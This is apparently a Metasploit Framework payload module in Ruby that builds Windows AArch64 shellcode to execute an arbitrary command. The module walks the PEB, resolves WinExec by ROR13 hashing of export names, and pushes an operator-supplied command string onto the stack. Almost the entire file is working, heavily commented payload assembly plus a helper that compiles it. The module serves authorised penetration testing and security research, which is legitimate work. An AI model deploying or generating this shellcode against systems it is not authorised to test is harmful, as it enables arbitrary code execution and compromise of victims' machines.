##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 376

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Execute Command',
        'Description' => 'Execute an arbitrary command (Windows AArch64)',
        'Author' => ['alanfoster'],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64
      )
    )

    register_options(
      [
        OptString.new('CMD', [true, 'The command string to execute'])
      ]
    )
  end

  def generate(_opts = {})
    result = <<~EOF
      // Notes:
      // Windows uses BRK for special operations.
      //            brk     #0xf000     ; breakpoint
      // https://devblogs.microsoft.com/oldnewthing/20220822-00/?p=107032
      // This allows you to place brk instructions in your payload, and visual studio etc
      // will trigger a breakpoint for you
      //
      // Calling conventions:
      //   https://devblogs.microsoft.com/oldnewthing/20220823-00/?p=107041
      //   https://devblogs.microsoft.com/oldnewthing/20220824-00/?p=107043 - stack frames
      //   x0 to x7: Argument values passed to and results returned from a subroutine. x0: return value.
      //   x8: function address for blr (Branch with Link to Register, i.e. subroutine call)
      //   x9 to x15: Local variables, caller saved
      //   x18: TEB
      //   x29 = frame pointer
      //   x30 = Link register - holds the address to return to when a subroutine call completes
      // Register conventions:
      //   x0-30 = 64 bits
      //   w0-30 = 32 bits

      // Integer and pointer parameters are passed in x0 through x7
      // Input: The hash of the API to call in x15, and its parameters (x0-x7)
      // Output: The return value from the API call will be in x0.
      // Clobbers: x8
      // Un-Clobbered: x0-x7, SP, BP, FP
      // Note: This function is unable to call forwarded exports.

      main:                                         //
          // function epilogue
          stp     x29, x30, [sp, #-0x30]!           // store pair: framepointer (x29), link register (x30), decrement sp
          stp     x19, x20, [sp, #0x10]             // store pair: x19, x20 (non-volatile) registers
          str     x21, [sp, #0x20]                  // store x21
          mov     x29, sp                           // establishing frame chain
          sub     sp, sp, #0x80                     // Decrement SP for additional stack space, for temp values

          // 0x876F8B31 - hash( "kernel32.dll", "WinExec" )
          movz w8, #0                               //
          movk w8, #0x876f, lsl #16                 //
          movk w8, #0x8b31                          //

      // Start of Block API
      api_call:                                     //
          ldr x10, [x18, #0x60]                     // In user mode, register 18 points to TEB. Get a pointer to PEB// PEB = TEB + 0x60
          ldr x10, [x10, #0x18]                     // Get PEB->Ldr - the loader which holds all of the loaded modules in the process
          ldr x10, [x10, #0x20]                     // Get ldrData->InMemoryOrderModuleList - get the first module from the InMemoryOrder module list

      next_mod:                                     //
          ldr x11, [x10, #0x50]                     // Get pointer to modules name (unicode string buffer)
          movz x12, #0                              // Clear x12 in preparation for copying the module name length
          // XXX: Ruby assembler bug: Next two instructions could just be 'ldrh w12, [x10, #0x4a]'
          // XXX: Ruby assembler bug: We can't use 0x4c to access maximum length due to Ruby assembler bug
          ldr x12, [x10, #0x4a]                     // x12 = length field (not MaximumLength due to assembler bug), Get the length of the unicode string, we zero the other bytes next
          and x12, x12, #0xffff                     // We only need 2 bytes for the length to work around

          movz w13, #0                              // Clear x13 which will store the hash of the module name
      loop_modname:                                 //
          movz x14, #0                              // x14 = next char. Clear x0 return value (TODO: Not needed as ldrh removes the existing bits?)
          ldrb w14, [x11], #0x1                     // Read byte of the name into x13, and post increment x11 pointer
          cmp w14, #97                              // Check if lowercase - cmp to 'a'
          b.lt not_lowercase                        //
          sub w14, w14, #0x20                       // If so normalise to uppercase
      not_lowercase:                                //
          ror w13, w13, #13                         // Rotate right our hash value
          add w13, w13, w14                         // Add the next byte of the name
          sub w12, w12, #1                          // Decrement remaining length/byte count
          cmp w12, wzr                              // Test if if remaining byte count is 0
          b.gt loop_modname                         // Loop until we have read enough

          // XXX: Ruby assembler bug: We need to manually run two ror13s for the null bytes missed by using Length instead of MaximumLength
          ror w13, w13, #13                         // XXX: ror13
          ror w13, w13, #13                         // XXX: ror13

          // We now have the module hash computed

          str x10, [sp, #8]                         // Save the current position in the module list for later
          str x13, [sp, #16]                        // Save the current module hash for later

          // Proceed to iterate the export address table
          ldr x10, [x10, #0x20]                     // Get this modules base address

          movz x11, #0                              //
          ldr w11, [x10, #0x3c]                     // Get PE header e_lfanew

          add x11, x11, x10                         // Add the module base address - (ULONG_PTR) module_entry->DllBase + dosHeader->e_lfanew

          // TODO: rax=x11, rdx=x10
          // TODO: cmp word [rax+0x18], 0x020B // is this module actually a PE64 executable?
          // TODO: this test case covers when running on wow64 but in a native x64 context via nativex64.asm and
          // TODO: their may be a PE32 module present in the PEB's module list, (typicaly the main module).
          // TODO: as we are using the win64 PEB ([gs:96]) we wont see the wow64 modules present in the win32 PEB ([fs:48])
          // TODO: jne get_next_mod1           // if not, proceed to the next module

          ldr w11, [x11, 0x88]                      // Get export tables RVA
          cmp x11, #0x0                             // Test if no export address table is present
          b.eq get_next_mod1                        // If no EAT present, process the next module
          add x11, x11, x10                         // Add the modules base address
          str x11, [sp, #24]                        // Save the current modules EAT
          ldr w12, [x11, #0x18]                     // Get the number of function names (DWORD) - ecx / rcx
          ldr w13, [x11, #0x20]                     // Get the rva of the function names
          add x13, x13, x10                         // Add the modules base address to get function names virtual address - r8
        // Computing the module hash + function hash
        get_next_func:                              //
          cmp w12, #0                               // Test if number of remaining functions is zero
          b.eq get_next_mod                         // When we reach the start of the EAT (we search backwards), process the next module
          sub w12, w12, #1                          // Decrement the function name counter
          mov x14, #0x4                             // sizeof(DWORD*) for eat's function names table elements
          madd x15, x12, x14, x13                   // Compute base of func name, i.e. rvaFunctionName = (functionNameIndex * 0x04) + rvaOfFunctionNames
          ldr w15, [x15]                            // Get rva of next module name
          add x15, x15, x10                         // Add the modules base address
          movz    x5, #0x0                          // Clear x5 which will store the hash of the function name

      loop_funcname:                                //
          movz x11, #0x0                            // Clear x11
          ldrb w11, [x15], #0x1                     // Read in the next byte of the ASCII function name
          ror w5, w5, #13                           // Rotate right our hash value
          add w5, w5, w11                           // Add the next byte of the name
          cmp x11, #0x0                             // Test if null
          b.ne loop_funcname                        // If we have not reached the null terminator, continue
          ldr w6, [sp, #16]                         // Load the current module hash

          add w6, w6, w5                            // Add the current module hash to the function hash

          cmp w6, w8                                // Compare the hash to the one we are searching for
          b.ne get_next_func                        // Go compute the next function hash if we have not found it

          // If found, fix up stack, call the function and then value else compute the next one...

          ldr x11, [sp, #24]                        // Restore the current modules EAT - r8

          ldr w13, [x11, #0x24]                     // Get the ordinal table rva
          add x13, x13, x10                         // Add the modules base address

          mov x14, #0x2                             // sizeof(WORD) for eat's name ordinal array elements
          madd x15, x12, x14, x13                   // Compute desired functions ordinal memory location, i.e. rvaOrdinalPtr = (functionNameIndex * 0x02) + vaOrdinalArray

          ldrh w15, [x15]                           // Get the desired functions ordinal
          //and x12, x12, #0xffff // wordify, TODO: Replace with a better ldr instruction

          ldr w13, [x11, #0x1c]                     // Get the function addresses table rva
          add x13, x13, x10                         // Add the modules base address

          mov x14, #0x4                             // sizeof(DWORD) for eat's address functions
          madd x15, x15, x14, x13                   // Compute desired functions function RVA, i.e. rvaFunctionPtr = (ordinalIndex * 0x04) + vaFunctionArray
          ldr w15, [x15]                            // Get the function's RVA
          add x15, x15, x10                         // Add the modules base address to get the functions actual VA

      finish:                                       //
          // Call
          mov x9, sp                                // Temporarily move SP into scratch register

          // WinExec(str, 1)
          // First argument
          mov x9, sp // Temporarily move SP into scratch register
          #{create_aarch64_string_in_stack("#{datastore['CMD']}\x00", registers: { destination: :x0, stack: :x9 })}

          mov w1, #0x1                              // Second argument
          mov x8, x15                               // Move function address to x8

          // TODO: Clear things

          blr x8                                    // Jump to found location

          // function prologue
          add     sp, sp, #0x80                     // discard local stack area
          ldr     x21, [sp, #0x20]                  // restore register x21
          ldp     x19, x20, [sp, #0x10]             // restore pair: x19, x20 (non-volatile) registers
          ldp     x29, x30, [sp], #0x30             // restore pair: framepointer (x29), link register (x30), increment sp
          ret                                       // return using link register

      get_next_mod:                                 //
          ldr x11, [sp, #24]                        // Pop off the current (now the previous) modules EAT
      get_next_mod1:                                //
          // pop r9                      // Pop off the current (now the previous) modules hash
          // pop rdx                     // Restore our position in the module list
          // mov rdx, [rdx]              // Get the next module
          // jmp next_mod                // Process this module

          ldr x10, [sp, #8]                         // Restore our position in the module list
          ldr x13, [sp, #16]                        // Restore off the current (now the previous) modules hash
          ldr x10, [x10]                            // Get the next module
          b next_mod                                // Process this module
    EOF

    compile_aarch64(result)
  end

  def create_aarch64_string_in_stack(string, registers: {})
    target = registers.fetch(:destination, :x0)
    stack = registers.fetch(:stack, :x9)

    # Instructions for pushing the bytes of the string 8 characters at a time
    push_string = string.bytes
                        .each_slice(8)
                        .each_with_index
                        .flat_map do |eight_byte_chunk, _chunk_index|
      mov_instructions = eight_byte_chunk
                         .each_slice(2)
                         .each_with_index
                         .map do |two_byte_chunk, index|
        two_byte_chunk = two_byte_chunk.reverse
        two_byte_chunk_hex = two_byte_chunk.map { |b| b.to_s(16).rjust(2, '0') }.join
        two_byte_chunk_chr = two_byte_chunk.map(&:chr).join
        "mov#{index == 0 ? 'z' : 'k'} #{target}, #0x#{two_byte_chunk_hex}#{index == 0 ? '' : ", lsl ##{index * 16}"} // #{two_byte_chunk_chr.inspect}"
      end
      [
        "// Next 8 bytes of string: #{eight_byte_chunk.map(&:chr).join.inspect}",
        *mov_instructions,
        "str #{target}, [#{stack}], #8 // Store #{target} on #{stack}-stack and increment by 8"
      ]
    end
    push_string = push_string.join("\n") + "\n"

    set_target_register_to_base_of_string = <<~EOF
      mov #{target}, #{stack} // Store the current stack location in the target register
      sub #{target}, #{target}, ##{align(string.bytesize)} // Update the target register to point to base of the string
    EOF

    result = <<~EOF
      #{push_string}
      #{set_target_register_to_base_of_string}
    EOF

    result
  end

  def align(value, alignment: 8)
    return value if value % alignment == 0

    value + (alignment - (value % alignment))
  end

  def compile_aarch64(asm_string)
    require 'aarch64/parser'
    parser = ::AArch64::Parser.new
    asm = parser.parse without_inline_comments(asm_string)

    asm.to_binary
  end

  # Remove any human readable comments that have been inlined
  def without_inline_comments(string)
    comment_delimiter = '//'
    result = string.lines(chomp: true).map do |line|
      instruction, _comment = line.split(comment_delimiter, 2)
      next if instruction.blank?

      instruction
    end.compact
    result.join("\n") + "\n"
  end
end
